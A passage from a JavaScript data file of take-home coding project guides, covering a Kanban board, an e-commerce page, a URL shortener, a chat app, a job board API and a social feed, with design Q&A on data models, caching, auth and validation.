      'Persist board state to localStorage with debounced auto-save and conflict-free restoration on reload',
    ],
    keyQuestions: [
      { question: 'Which drag-and-drop library should I use?', answer: '@dnd-kit is the modern standard for React drag-and-drop. It provides a composable hook-based API with separate packages for core functionality (@dnd-kit/core) and sortable lists (@dnd-kit/sortable). It handles sortable cards within columns, droppable column containers, keyboard accessibility with customizable key bindings, touch and pointer support, and collision detection strategies. Avoid react-beautiful-dnd which was deprecated by Atlassian in 2024, and avoid the HTML5 Drag and Drop API which has poor mobile support, limited styling control, and no keyboard accessibility. @dnd-kit also supports multiple drag overlay strategies: you can render a scaled-down card preview that follows the cursor, which creates a polished drag experience. The library is tree-shakeable and adds minimal bundle size compared to alternatives.' },
      { question: 'How do I model the data structure?', answer: 'Use a normalized state shape with two entity maps and an ordering array: { columns: { [id]: Column }, cards: { [id]: Card }, columnOrder: string[] }. Each Column has id, title, and cardIds (ordered array of card IDs in that column). Each Card has id, columnId, title, description, labels array, dueDate, and order (float value). Float-based ordering is critical for efficient reordering: when inserting a card between two others with orders 1.0 and 2.0, assign the new card order 1.5. This avoids renumbering all subsequent cards on every move. When the float precision gets too fine (after many insertions in the same gap), normalize all card orders in that column to integers. This is the same strategy that Google Docs and Figma use for element ordering.' },
      { question: 'How do I handle cross-column moves?', answer: 'Cross-column moves are the most complex operation. In dnd-kit onDragEnd handler: 1) Identify the source column (where the card is being dragged from) and target column (where it is being dropped) using the active.data and over.data contexts. 2) Remove the card ID from the source column cardIds array. 3) Calculate the target position index based on the over item position. 4) Insert the card ID into the target column cardIds array at that index. 5) Update the card object columnId to the target column ID. 6) Recalculate float order values for the cards at and around the insertion point. 7) Apply all these state changes atomically in a single setState call (or Zustand action) so the UI updates in one frame without flickering. 8) Persist the updated state to storage asynchronously after the optimistic update.' },
      { question: 'What features make this production-quality?', answer: 'Keyboard accessibility is essential: users should be able to tab through cards, use arrow keys to move between columns, press Enter to open card details, and press Space to pick up and drop cards. Undo/redo with Cmd+Z and Cmd+Shift+Z using a state history stack lets users recover from accidental moves. Search and filter across all cards helps on large boards. A drag placeholder animation (a ghost outline showing where the card will land) provides clear visual feedback during drag. Column WIP (Work In Progress) limits with visual warnings when a column has too many cards enforce Kanban methodology. Smooth card creation animation with Framer Motion animatePresence makes new cards slide in rather than pop. These features collectively take a few hours to implement but transform the project from a demo into something that feels like a real product.' },
      { question: 'How do I implement the task detail modal?', answer: 'The task detail modal opens when a user clicks a card. It should contain: an editable title (click to edit, blur or Enter to save), a rich text description field (simple textarea or a lightweight rich text editor), a labels section with colored tags that can be added from a predefined set or created custom, a due date picker, a checklist with add/remove/toggle items and a progress bar, and an activity log showing when the card was created, moved, and edited. Use a fixed-position overlay with a semi-transparent backdrop. Implement a focus trap so Tab cycles within the modal. Close on Escape key press or click outside. The modal should use a URL param (?card=card-id) so direct links to specific cards work. Optimistically update all edits immediately in the UI state and debounce persistence to storage.' },
      { question: 'How do I persist the board state?', answer: 'For a take-home, localStorage is the appropriate persistence layer. Serialize the entire board state (columns, cards, columnOrder) as JSON and save on every mutation, debounced by 500ms. On page load, check localStorage for saved state and restore it, falling back to a default board with sample columns and cards. Use a version key in the saved data to handle schema migrations if you change the data model during development. For production, you would replace localStorage with a REST API: POST /api/boards/:id/moves for each drag operation, with the backend applying the move and broadcasting updates to other connected clients via WebSocket. The frontend optimistic update pattern stays the same; only the persistence layer changes.' },
    ],
  },
  {
    id: 'ecommerce-product-page',
    title: 'E-commerce Product Page',
    icon: 'shoppingCart',
    color: '#7c3aed',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Zustand', 'React Hook Form', 'Zod'],
    questions: 6,
    description: 'Build a product listing page with image gallery, variant selection, cart management, checkout flow, and responsive design.',
    introduction: 'Create a Shopify-style product browsing experience: product grid, detail page with image carousel, size/color variant picker, add-to-cart with quantity, persistent cart sidebar, and a multi-step checkout form. Focuses on e-commerce UI patterns and state management.\n\nE-commerce product pages are the bread and butter of web development. Nearly every frontend developer will build or maintain an e-commerce UI at some point in their career, and the patterns involved (image galleries, variant matrices, cart state management, and multi-step forms) appear in countless other contexts. Building a polished product page from scratch demonstrates that you understand conversion-focused design and complex state orchestration.\n\nThe variant selection system is particularly interesting from an engineering perspective. You need to model a matrix of options (sizes times colors), map each combination to a SKU with its own price, inventory count, and product image, and disable unavailable combinations while keeping the interface intuitive. This is the exact problem that Shopify, Amazon, and Nike solve, and understanding the data model behind it shows real-world engineering depth.\n\nFor interviews, this project works especially well at e-commerce companies, agencies, and any role that involves building consumer-facing UIs. The cart implementation with Zustand persistence, the image gallery with zoom interaction, and the multi-step checkout form each provide rich material for technical discussions.',
    interviewRelevance: 'E-commerce UIs test your skills with complex forms, state management (cart), responsive image handling, and conversion-focused design. Common take-home for roles at e-commerce companies and agencies. The variant selection matrix demonstrates data modeling skills and constraint propagation (disabling unavailable combinations). Cart state with Zustand persistence shows professional state management patterns. The image gallery with zoom-on-hover tests mouse event handling and CSS transform mastery. Multi-step checkout forms test form validation architecture, step navigation, and data persistence across steps. Responsive design for product pages is non-trivial because the layout must work across image-heavy desktop grids and single-column mobile views. This project opens discussions about conversion rate optimization, A/B testing patterns, and performance optimization for image-heavy pages.',
    learningObjectives: [
      'Build a product image gallery with thumbnail navigation and zoom-on-hover',
      'Implement variant selection (size, color) with inventory-aware availability',
      'Create a persistent cart with add/remove/update quantity and subtotal calculation',
      'Build a multi-step checkout form with validation and order summary',
      'Use Zustand with persist middleware for cart state that survives page refresh',
      'Implement image lazy loading and responsive srcset for different viewport sizes',
      'Handle variant combination constraints: disable out-of-stock combinations dynamically',
      'Build a slide-in cart sidebar with item list, quantity controls, and subtotal calculation',
      'Create a progress stepper component that visually indicates completed, current, and upcoming steps',
      'Add form validation with Zod schemas and React Hook Form for per-field error messages',
    ],
    keyQuestions: [
      { question: 'How should I manage cart state?', answer: 'Use Zustand with the persist middleware for localStorage persistence. The cart store shape: { items: Array<{ productId, variantId, quantity, price, name, image }>, addItem(item), removeItem(variantId), updateQuantity(variantId, qty), clearCart() }. Compute derived values (total items, subtotal, tax, grand total) as getters rather than storing them. The persist middleware automatically serializes the store to localStorage on every change and rehydrates on page load. Show the cart item count as a badge on the cart icon in the header. Use Zustand subscriptions to animate the badge when items are added. The key design decision is using variantId (not productId) as the cart item key, since the same product in different sizes or colors are distinct line items with potentially different prices.' },
      { question: 'How do I build the image gallery?', answer: 'The gallery has three parts: a main image display area, a thumbnail strip, and a zoom interaction. The main image shows the currently selected product image at large size. Below it, a horizontal strip of thumbnails lets users click to swap the main image. Add a smooth crossfade transition on main image change using opacity animation or a CSS transition on the background-image property. For zoom-on-hover: track mouse position relative to the main image container using onMouseMove. Apply CSS transform: scale(2) and set transform-origin to the cursor position as a percentage of the container dimensions. This creates a magnifying glass effect that follows the cursor. On mobile, support swipe gestures with touch events: track touchstart and touchmove to detect horizontal swipes and advance to the next or previous image. Add dots or a page indicator below the mobile carousel.' },
      { question: 'How do variant selections work?', answer: 'Model variants as a combination matrix. The product has option types (for example, size and color), each with an array of values. Every valid combination maps to a SKU record: { skuId, size, color, price, inventory, imageIndex }. When the user selects a size, check which colors are available in that size by filtering SKUs where size matches and inventory is greater than zero. Disable unavailable color options visually with a grey overlay and strikethrough. When both options are selected, look up the corresponding SKU to get the specific price and switch the gallery to show that variant image. If inventory is zero for the selected combination, show an "Out of Stock" badge and disable the Add to Cart button. This constraint propagation makes the UI feel intelligent and prevents users from adding unavailable items to the cart.' },
      { question: 'What checkout flow is expected?', answer: 'A three-step checkout flow: Step 1 is Shipping Information (name, address line 1 and 2, city, state, zip code, phone number, with Zod validation for required fields and format checks). Step 2 is Payment Details (card number with formatting, expiry date, CVV, and cardholder name, all mocked since you are not processing real payments). Step 3 is Review and Place Order (summary of all items, shipping address, payment method last four digits, and edit links that navigate back to the relevant step preserving all entered data). Build a progress stepper component at the top that shows completed steps with a checkmark, the current step highlighted, and upcoming steps greyed out. Validate each step before allowing the user to proceed to the next. On successful order placement, show a confirmation page with an order number and animation.' },
      { question: 'How do I handle the responsive layout?', answer: 'The product detail page has fundamentally different layouts at different breakpoints. On desktop (1024px+), use a two-column layout: image gallery on the left taking 55% of the width, and product details (title, price, variants, add-to-cart, description) on the right taking 45%. On tablet (640-1024px), stack them vertically but keep the image gallery at a constrained height. On mobile (below 640px), the image gallery becomes a swipeable carousel with dot indicators, and all content stacks in a single column. The product grid page uses CSS Grid with repeat(auto-fill, minmax(280px, 1fr)) for a responsive multi-column layout. Product cards show the image, title, price, and available colors as small swatches. Use srcset on product images to serve appropriately sized images for each viewport, reducing bandwidth on mobile.' },
      { question: 'How do I optimize product image performance?', answer: 'Product pages are image-heavy and image loading speed directly impacts conversion rates. Use the HTML img srcset attribute with multiple image sizes: srcset="product-400.webp 400w, product-800.webp 800w, product-1200.webp 1200w" with a sizes attribute that maps to your responsive breakpoints. Use WebP format with JPEG fallback for browsers that do not support it. Add loading="lazy" to images below the fold (product grid items beyond the first row). For the main product image on the detail page, use loading="eager" since it is the primary content. Add width and height attributes to prevent layout shift (Cumulative Layout Shift, a Core Web Vital). For the zoom feature, load the high-resolution zoom image only when the user hovers, not on initial page load, using a separate onMouseEnter trigger.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // FULL-STACK APPLICATIONS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'url-shortener',
    title: 'URL Shortener',
    icon: 'link',
    color: '#10b981',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['Node.js', 'Express', 'PostgreSQL', 'Redis', 'React', 'Recharts'],
    questions: 6,
    description: 'Build a full-stack URL shortener with custom aliases, click analytics, expiration, rate limiting, and a dashboard showing top links.',
    introduction: 'Create a Bit.ly-style service. Users submit a long URL, get a short link, and see real-time click analytics (total clicks, clicks by country/device/referrer, click timeline chart). Build the backend API, redirect service, and analytics dashboard.\n\nThe URL shortener is the single most frequently asked system design interview question, and actually building one demonstrates that you understand the topic at a depth that whiteboard discussions alone cannot convey. You will implement a short code generation strategy, design a database schema for URLs and click events, build a Redis caching layer for fast redirects, and create an analytics dashboard that aggregates click data across multiple dimensions.\n\nThe engineering challenges are surprisingly rich. The redirect endpoint must be extremely fast (every millisecond of latency costs user trust) so you need Redis cache-aside with PostgreSQL fallback. Click tracking must be asynchronous to avoid blocking the redirect response. Short code generation must handle collisions without degrading performance. Rate limiting prevents abuse while keeping the API responsive for legitimate users.\n\nFor interviews, this project is a goldmine. You can walk through the system design with concrete implementation details: cache hit ratios, database indexing strategies, the trade-off between Base62 encoding and random codes, async event processing, and time-series analytics aggregation. Having working code transforms a theoretical system design answer into a credible engineering discussion.',
    interviewRelevance: 'The classic system design interview question, but actually built. Demonstrates: hashing strategies, database indexing, caching with Redis, rate limiting, analytics data modeling, and full-stack integration. Interviewers specifically ask about short code generation strategies and you can discuss Base62 vs random with collision probability math. The Redis caching layer shows cache-aside pattern mastery. Async click tracking demonstrates event-driven architecture thinking. The analytics dashboard shows time-series data modeling skills. Rate limiting implementation proves you understand API protection patterns. This project naturally scales into discussions about horizontal scaling, CDN-based redirects, and distributed ID generation.',
    learningObjectives: [
      'Design a URL shortening strategy: Base62 encoding of auto-increment ID or random short code',
      'Build Redis caching layer for hot URLs (cache-aside pattern with TTL)',
      'Implement click tracking with async event processing (don\'t block redirects)',
      'Create analytics dashboard with time-series charts, top URLs, and geographic breakdown',
      'Add rate limiting (per-IP creation limits) and URL expiration',
      'Handle short code collisions with retry logic and unique database constraints',
      'Design a click events table optimized for both write throughput and analytical queries',
      'Build URL validation and sanitization to prevent malicious redirect targets',
      'Implement custom alias support with profanity filtering and reserved word blocking',
      'Create precomputed analytics aggregates for fast dashboard loading without scanning raw events',
    ],
    keyQuestions: [
      { question: 'How do I generate short codes?', answer: 'Two approaches with distinct trade-offs. Approach 1: Base62 encode the auto-increment database ID. The ID 1000 encodes to "g8" (6 characters max for billions of URLs). Advantages: guaranteed unique, deterministic, and fast. Disadvantage: sequential codes are guessable, so users could enumerate all short URLs. Approach 2: Generate random 7-character alphanumeric strings (62^7 = 3.5 trillion possibilities). Advantages: non-guessable and non-sequential. Disadvantage: collision probability follows the birthday paradox. At 1 million URLs, collision chance is roughly 1 in 3.5 million per insertion. Handle collisions by checking the unique index on short_code and retrying with a new random code. Three retries is sufficient; the probability of three consecutive collisions is astronomically low. For production, approach 2 is preferred for security; for a take-home, either is fine with a note about the trade-off.' },
      { question: 'How should I handle redirects efficiently?', answer: 'The redirect endpoint GET /:shortCode must be fast because every millisecond of latency degrades user experience. Implement a cache-aside pattern: check Redis first (SET shortCode originalUrl with TTL of 24 hours), which resolves in roughly 1ms. On cache miss, query PostgreSQL (roughly 5ms with an indexed lookup), cache the result in Redis, and redirect. Return 302 (temporary) redirect, not 301 (permanent), because 301 causes browsers to cache the redirect and skip your server entirely, which means you cannot track clicks or change the destination URL later. Log the click event asynchronously: push a click event to a Redis list or in-memory queue, and process it in a background worker that batch-inserts into PostgreSQL every second. This ensures the redirect response returns in under 5ms regardless of database write latency.' },
      { question: 'What analytics should I track?', answer: 'Capture per-click data: timestamp (millisecond precision), IP address (for geographic lookup via a GeoIP database like MaxMind), user-agent string (parse into device type, browser, and OS using a library like ua-parser-js), referrer URL (where the click came from), and the short code. Store raw events in a clicks table with a composite index on (url_id, clicked_at) for time-range queries. For the dashboard, precompute hourly aggregates in a clicks_hourly table: (url_id, hour, click_count, unique_ips, top_referrer, device_breakdown JSONB). Run an aggregation job every hour that rolls up raw events. The dashboard queries the aggregate table for fast loading, with the option to query raw events for the most recent hour. Display: total clicks, unique visitors, clicks-over-time line chart, top referrers bar chart, device pie chart, and geographic heat map.' },
      { question: 'How do I implement rate limiting?', answer: 'Use Redis for a sliding window rate limiter. On each URL creation request, construct a key like ratelimit:create:{ip}:{minute} where minute is the current Unix minute. Run INCR on the key and EXPIRE it after 60 seconds. If the count exceeds 10 (configurable), return 429 Too Many Requests with a Retry-After header indicating seconds until the window resets. For the redirect endpoint, apply a separate higher limit (1000/minute per IP) to prevent abuse while allowing normal usage. Add response headers for transparency: X-RateLimit-Limit (max allowed), X-RateLimit-Remaining (remaining in current window), X-RateLimit-Reset (Unix timestamp when window resets). For the implementation, use a Lua script to make the INCR + EXPIRE + comparison atomic, preventing race conditions where two concurrent requests both read under the limit.' },
      { question: 'What database schema should I use?', answer: 'Two primary tables. urls stores the short link metadata: id (serial PK), short_code (varchar 10, UNIQUE NOT NULL with B-tree index), original_url (text NOT NULL), user_id (optional FK), custom_alias (boolean), created_at (timestamptz), expires_at (timestamptz, nullable), click_count (integer default 0, denormalized for fast dashboard display). clicks stores raw event data: id (bigserial PK for high-volume writes), url_id (integer FK), clicked_at (timestamptz NOT NULL), ip (inet), user_agent (text), referrer (text), country (varchar 2), device (varchar 10). Critical index: CREATE INDEX idx_clicks_url_time ON clicks(url_id, clicked_at DESC) for time-range analytics queries. Add a partial index on urls WHERE expires_at IS NOT NULL AND expires_at < NOW() for efficient expired URL cleanup. The clicks table will grow large, so consider partitioning by month for production scale.' },
      { question: 'How do I handle URL validation and security?', answer: 'Validate submitted URLs on multiple levels. First, parse with the URL constructor and reject anything that is not http or https protocol (block javascript:, data:, and file: schemes). Second, resolve the hostname and reject private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16) to prevent SSRF attacks where someone uses your shortener to access internal services. Third, check the URL against a blocklist of known phishing and malware domains (Google Safe Browsing API or a local blocklist). Fourth, enforce a maximum URL length (2048 characters is a reasonable limit). Fifth, for custom aliases, block reserved words (api, admin, health, static) and run a profanity filter. Return descriptive validation errors: "Invalid URL format", "URL scheme must be http or https", "This domain is blocklisted". These validations are not just good practice; they show security awareness that interviewers specifically look for.' },
    ],
  },
  {
    id: 'realtime-chat-app',
    title: 'Real-time Chat App',
    icon: 'messageSquare',
    color: '#06b6d4',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'Node.js', 'Socket.io', 'MongoDB', 'Tailwind CSS', 'JWT'],
    questions: 6,
    description: 'Build a Slack-style real-time chat with rooms, direct messages, typing indicators, online presence, and message history.',
    introduction: 'Create a multi-room chat application. Users log in, join rooms, send messages that appear instantly for all participants, see who is typing, and view online/offline status. Messages persist in MongoDB with pagination for history loading.\n\nReal-time chat is one of the most challenging full-stack projects because it exercises every layer of the stack simultaneously. The frontend must handle optimistic message rendering, scroll position management during history loading, and real-time updates from multiple rooms. The backend must manage persistent WebSocket connections, room-based broadcasting, user presence tracking, and message persistence.\n\nSocket.io abstracts much of the WebSocket complexity but you still need to design the event protocol, handle reconnection gracefully, prevent duplicate messages, and maintain correct message ordering when network conditions are poor. These are the same challenges that Slack, Discord, and Microsoft Teams solve at scale.\n\nFor interviews, this project demonstrates WebSocket expertise, real-time state synchronization, and the ability to handle distributed system challenges like reconnection, eventual consistency, and offline queuing. These skills are highly relevant for any role involving real-time features.',
    interviewRelevance: 'Tests WebSocket mastery, real-time state synchronization, database design for chat (messages, rooms, participants), and handling edge cases like reconnection, message ordering, and offline queuing. Socket.io room management demonstrates pub/sub pattern understanding. Typing indicators show debouncing and ephemeral state management. Message pagination with cursor-based queries demonstrates database performance awareness. Reconnection handling with message gap filling shows distributed systems thinking. The project opens discussions about horizontal scaling with Redis adapter, message delivery guarantees, and eventual consistency patterns.',
    learningObjectives: [
      'Implement WebSocket communication with Socket.io (rooms, namespaces, events)',
      'Build real-time features: typing indicators, online presence, read receipts',
      'Design MongoDB schema for messages, rooms, and user presence',
      'Handle edge cases: reconnection, message ordering, duplicate prevention',
      'Implement cursor-based message pagination for infinite scroll history loading',
      'Build an optimistic message rendering system that shows messages instantly before server acknowledgment',
      'Create a room management system: create, join, leave, invite, and list rooms',
      'Handle online/offline presence tracking with heartbeat pings and disconnect detection',
      'Implement message deduplication using client-generated message IDs to prevent double-sends on reconnection',
      'Build notification sounds and unread message badges for rooms with new activity',
    ],
    keyQuestions: [
      { question: 'How does Socket.io room management work?', answer: 'Socket.io rooms are a server-side concept for grouping connections. When a user opens a chat room, the server calls socket.join("room-id") to add that connection to the room. Broadcasting to a room is done with io.to("room-id").emit("message", data), which sends the event to all sockets in that room. To exclude the sender, use socket.to("room-id").emit(). On disconnect, Socket.io automatically removes the socket from all rooms. Use socket.rooms (a Set) to check which rooms a socket belongs to. For direct messages, create a room named after both user IDs sorted (for example, "dm:user1:user2") so both participants join the same room regardless of who initiates. When scaling horizontally across multiple server instances, use the Redis adapter (@socket.io/redis-adapter) which publishes room events to Redis pub/sub, ensuring broadcasts reach sockets on all server instances.' },
      { question: 'How do I implement typing indicators?', answer: 'Typing indicators are ephemeral events that should not be persisted. On the client: add a keydown listener on the message input. When the user types, emit a "typing" event to the server with the room ID, but debounce it to once every 500ms to avoid flooding the server with events. When the user stops typing (no keydown for 1 second), emit a "stop-typing" event. On the server: broadcast the "user-typing" event to all other users in the room (socket.to(roomId).emit). On receiving clients: show "Alice is typing..." below the message list. Set a 3-second timeout that clears the indicator, in case the "stop-typing" event is lost. If multiple users are typing simultaneously, show "Alice and Bob are typing..." or "3 people are typing...". Store typing state in a Map keyed by room ID and user ID, cleared by timeout or explicit stop event.' },
      { question: 'How should I paginate message history?', answer: 'Use cursor-based pagination, not offset-based, for chat history. On initial room load, fetch the latest 50 messages sorted by createdAt descending. When the user scrolls to the top of the message list, trigger a fetch for the next 50 messages with a cursor: the createdAt timestamp of the oldest currently loaded message. The MongoDB query is: db.messages.find({ roomId, createdAt: { $lt: cursorTimestamp } }).sort({ createdAt: -1 }).limit(50). Cursor-based pagination is essential for chat because new messages are constantly being inserted at the end. With offset pagination, inserting a new message shifts all offsets by one, causing duplicate or missing messages on the next page load. After fetching older messages, preserve the user scroll position by measuring the scroll container height before and after inserting messages, then adjusting scrollTop by the difference. This prevents the jarring jump that occurs when content is prepended.' },
      { question: 'How do I handle reconnection?', answer: 'Socket.io includes automatic reconnection with exponential backoff (1s, 2s, 4s, up to 30s by default). On reconnect, three things must happen. First, re-join all rooms: the server must re-add the socket to the rooms it was previously in. Store the user active rooms in the database or server memory keyed by user ID, not socket ID (which changes on reconnect). Second, fill the message gap: the client tracks the timestamp of the last received message. On reconnect, request all messages since that timestamp via a REST endpoint (not WebSocket, to avoid overwhelming the reconnection handshake). Third, re-broadcast presence: emit a "user-online" event to all rooms so other users update the presence indicator. Handle the gap-fill response by deduplicating against locally cached messages using message ID, since some messages may have arrived just before the disconnect.' },
      { question: 'How do I prevent duplicate messages?', answer: 'Duplicates occur in two scenarios: the user clicks Send twice quickly, or the client retries a message on reconnection without knowing the server received the first attempt. Solve this with client-generated message IDs. Before sending, generate a UUID on the client and include it in the message payload. Display the message optimistically in the UI with a "sending" status. On the server, before inserting into MongoDB, check if a message with that ID already exists. If it does, skip the insert but still acknowledge back to the client. Use a unique index on the message ID field for an atomic check-and-insert. The client updates the message status to "sent" on acknowledgment or "failed" after a timeout. Failed messages show a retry button.' },
      { question: 'How do I implement online presence tracking?', answer: 'Track presence using a combination of Socket.io events and Redis. When a user connects, add their user ID to a Redis set (SADD online_users userId) and broadcast a "user-online" event to all rooms they belong to. On disconnect, wait 5 seconds before removing them (to handle transient disconnects during page navigation), then SREM from Redis and broadcast "user-offline". The 5-second grace period prevents the online indicator from flickering during page refreshes. To display the online users list for a room, intersect the room members with the online_users set. Show online users with a green dot and offline users with a grey dot. For idle detection, the client sends a heartbeat every 30 seconds. If no heartbeat arrives for 60 seconds, mark the user as "away" with a yellow dot. Reset to "online" on the next heartbeat or message send.' },
    ],
  },
  {
    id: 'job-board-api',
    title: 'Job Board API',
    icon: 'briefcase',
    color: '#0284c7',
    difficulty: 'intermediate',
    estimatedTime: '5-7 hours',
    techStack: ['Express', 'PostgreSQL', 'JWT', 'React', 'Tailwind CSS', 'bcrypt'],
    questions: 6,
    description: 'Build a REST API for a job board with authentication, role-based access (employer/candidate), job CRUD, application flow, and admin panel.',
    introduction: 'Create a complete job board backend and frontend. Employers post jobs, candidates browse and apply, admins moderate. Implement JWT auth with role-based permissions, pagination, search, and application state machine (applied → reviewed → interviewed → offered → rejected).\n\nThe job board is a rich domain that exercises every aspect of full-stack development: multi-role authentication and authorization, complex database relationships, state machine workflows, full-text search, and a responsive frontend. The three user roles (employer, candidate, admin) create a natural permission matrix that tests your ability to design role-based access control properly.\n\nThe application state machine is particularly interesting because it models a real-world workflow with constraints: only employers can advance application status, certain transitions are invalid (you cannot go from rejected back to screening), and every transition must be logged for audit purposes. This pattern appears in countless business applications from order processing to insurance claims.\n\nFor interviews, this project demonstrates REST API design proficiency, authentication architecture, database schema design with multiple relationships, and the ability to model business logic as a state machine. It is especially relevant for startup roles where you would build exactly this kind of multi-stakeholder platform.',
    interviewRelevance: 'Tests REST API design, authentication/authorization, role-based access control, database schema design with relationships, and state machine implementation. Common full-stack take-home for startup roles. The JWT authentication with refresh tokens shows security awareness. Role-based middleware demonstrates authorization pattern mastery. The application state machine with audit logging shows you can model real business workflows. Full-text search implementation demonstrates PostgreSQL beyond basic CRUD. Resource ownership validation (employers can only edit their own jobs) tests authorization granularity. This project opens discussions about OAuth integration, email notification pipelines, and scaling job search with Elasticsearch.',
    learningObjectives: [
      'Design a REST API with proper resource naming, pagination, and filtering',
      'Implement JWT authentication with role-based middleware (employer, candidate, admin)',
      'Build an application state machine with valid transitions and audit trail',
      'Create a search system with full-text search across job title, description, and company',
      'Handle resource ownership: employers can only modify their own jobs and view their own applicants',
      'Implement password hashing with bcrypt and JWT refresh token rotation',
      'Build pagination with cursor-based and offset approaches for different endpoints',
      'Add input validation with express-validator or Zod for all mutation endpoints',
      'Create an admin moderation interface for reviewing and approving job postings',
      'Design the database schema with proper indexes for search, filter, and sort operations',
    ],
    keyQuestions: [
      { question: 'What should the API design look like?', answer: 'Follow REST conventions with proper resource nesting. Authentication: POST /api/auth/register (create account with role), POST /api/auth/login (returns access + refresh tokens), POST /api/auth/refresh (rotate refresh token). Jobs: GET /api/jobs (public listing with filters: location, type, salary range, search text, pagination), POST /api/jobs (employer only, creates a draft), GET /api/jobs/:id (public detail), PUT /api/jobs/:id (employer owner only), DELETE /api/jobs/:id (employer owner or admin). Applications: POST /api/jobs/:id/applications (candidate only, submit application), GET /api/jobs/:id/applications (employer owner only, list applicants), PATCH /api/applications/:id/status (employer only, advance state machine). Profile: GET /api/users/me, PATCH /api/users/me. All list endpoints support query params: ?page=1&limit=20&sort=created_at&order=desc. Return proper HTTP status codes: 201 for creation, 204 for deletion, 401 for unauthenticated, 403 for unauthorized, 404 for not found, 422 for validation errors.' },
      { question: 'How do I implement role-based access?', answer: 'The JWT payload includes sub (user ID), email, role ("employer", "candidate", or "admin"), and expiration. Create three middleware functions: authenticate (verifies JWT and attaches user to request), requireRole(...roles) (checks user role against allowed roles, returns 403 if unauthorized), and requireOwnership(resourceFetcher) (checks that the authenticated user owns the resource, for example only the employer who created a job can edit it). Chain them on routes: router.post("/api/jobs", authenticate, requireRole("employer"), createJob). For the application status endpoint: router.patch("/api/applications/:id/status", authenticate, requireRole("employer"), requireApplicationOwnership, updateStatus). The requireApplicationOwnership middleware fetches the application, then the associated job, and verifies the job company_id matches the employer user. This prevents employers from modifying applications to jobs they do not own.' },
      { question: 'How should the application state machine work?', answer: 'Define valid transitions as a map: { applied: ["screening", "rejected"], screening: ["interviewing", "rejected"], interviewing: ["offered", "rejected"], offered: ["accepted", "rejected"], rejected: [], accepted: [] }. When an employer PATCH requests a status change, validate: 1) the new status exists in the valid transitions map for the current status, 2) the employer owns the job associated with the application. If valid, update the applications table status field and INSERT a row into application_events with application_id, from_state, to_state, actor_id (the employer), note (optional text from the request body), and created_at. If invalid, return 422 with a message like "Cannot transition from interviewing to applied. Valid transitions: offered, rejected." The audit trail in application_events is immutable and provides a complete history of every status change with who made it and when. This pattern is directly applicable to order processing, support ticket workflows, and approval chains.' },
      { question: 'What database schema should I use?', answer: 'Five tables with proper relationships. users: id (serial PK), email (unique), password_hash, role (CHECK IN employer, candidate, admin), name, profile_data (JSONB for flexible fields like bio, resume_url, company_name). companies: id, name, logo_url, website, owner_id (FK to users). jobs: id, company_id (FK), title, description (TEXT for full job posting), location, salary_min, salary_max, type (CHECK IN full-time, part-time, contract, remote), status (draft, active, closed), created_at. applications: id, job_id (FK), candidate_id (FK to users), status (applied, screening, interviewing, offered, accepted, rejected), resume_url, cover_letter, created_at, with a UNIQUE constraint on (job_id, candidate_id) to prevent duplicate applications. application_events: id, application_id (FK), from_state, to_state, actor_id (FK to users), note, created_at. Indexes: jobs(company_id), jobs(status, created_at) for active listing queries, applications(job_id) for employer view, applications(candidate_id) for candidate view, and a GIN index on jobs for full-text search.' },
      { question: 'How do I implement full-text search for jobs?', answer: 'PostgreSQL provides built-in full-text search that is sufficient for a job board at moderate scale. Add a generated tsvector column to the jobs table: ALTER TABLE jobs ADD COLUMN search_vector tsvector GENERATED ALWAYS AS (to_tsvector(\'english\', coalesce(title, \'\') || \' \' || coalesce(description, \'\') || \' \' || coalesce(location, \'\'))) STORED. Create a GIN index on the column. Query with: WHERE search_vector @@ plainto_tsquery(\'english\', $searchText). This handles stemming (searching "engineering" matches "engineer"), stop word removal, and relevance ranking via ts_rank(). For the API, combine full-text search with filters: WHERE search_vector @@ query AND location = $location AND type = $type AND salary_max >= $minSalary. This avoids the need for an external search engine like Elasticsearch for a take-home, while demonstrating PostgreSQL knowledge that interviewers value.' },
      { question: 'How should JWT authentication work with refresh tokens?', answer: 'Issue two tokens on login: an access token (short-lived, 15 minutes) and a refresh token (long-lived, 7 days). The access token is stored in memory (JavaScript variable) and sent in the Authorization header. The refresh token is stored in an httpOnly secure cookie. When the access token expires, the client automatically calls POST /api/auth/refresh with the cookie, which validates the refresh token and issues a new access/refresh pair. This pattern limits the damage of a stolen access token (15-minute window) while keeping the user logged in. On the server, store refresh tokens in a database table (user_id, token_hash, expires_at, revoked_at) so you can revoke them on logout or password change. Hash refresh tokens with SHA-256 before storage, just like passwords, so a database breach does not expose valid tokens. Implement token rotation: each refresh request invalidates the old refresh token and issues a new one, detecting stolen tokens when the old token is reused.' },
    ],
  },
  {
    id: 'social-media-feed',
    title: 'Social Media Feed',
    icon: 'users',
    color: '#8b5cf6',
    difficulty: 'advanced',
    estimatedTime: '8-10 hours',
    techStack: ['React', 'Node.js', 'PostgreSQL', 'Redis', 'Tailwind CSS', 'S3/Cloudinary'],
    questions: 6,
    description: 'Build a Twitter/Instagram-style social feed with infinite scroll, likes, comments, follow system, and real-time updates.',
    introduction: 'Create a social media timeline. Users create posts (text + images), follow other users, like and comment on posts, and see a personalized feed. Implement infinite scroll with cursor-based pagination, optimistic like/unlike, and a follow-based feed algorithm.\n\nThe social media feed is the most commonly asked system design question in engineering interviews, and building a working implementation demonstrates understanding at a level that whiteboard discussions cannot match. You will implement the core feed generation algorithm, choosing between fan-out-on-write and fan-out-on-read strategies, and experience first-hand the trade-offs that Twitter and Instagram faced at scale.\n\nThe technical complexity spans multiple domains: a follow graph that determines which posts appear in a user timeline, denormalized counters for like and comment counts cached in Redis for read performance, optimistic UI updates that provide instant feedback while async operations complete in the background, and infinite scroll with cursor-based pagination that handles new posts being inserted at the top of the feed.\n\nThis is an advanced project that touches nearly every system design concept: data modeling, caching strategies, fan-out architecture, denormalization trade-offs, real-time updates, and image storage. For senior engineering interviews, being able to reference working code for each of these concepts is enormously powerful.',
